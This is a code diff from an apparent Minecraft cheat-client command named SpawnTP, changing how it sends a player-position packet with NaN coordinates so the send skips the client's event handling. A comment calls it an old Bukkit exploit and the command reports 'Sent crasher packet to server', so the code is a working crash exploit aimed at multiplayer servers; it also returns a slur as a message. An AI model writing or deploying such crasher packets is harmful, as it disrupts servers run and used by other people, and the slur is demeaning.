@@ -19,7 +19,7 @@ public class SpawnTP extends Command {
         if (mc.isSingleplayer()) return "retard";
 
         // funny old bukkit exploit
-        mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(
+        mc.thePlayer.sendQueue.addToSendQueueNoEvent(new C04PacketPlayerPosition(
                 Double.NaN, Double.NaN, Double.NaN, Double.NaN, false));
 
         return "Sent crasher packet to server";
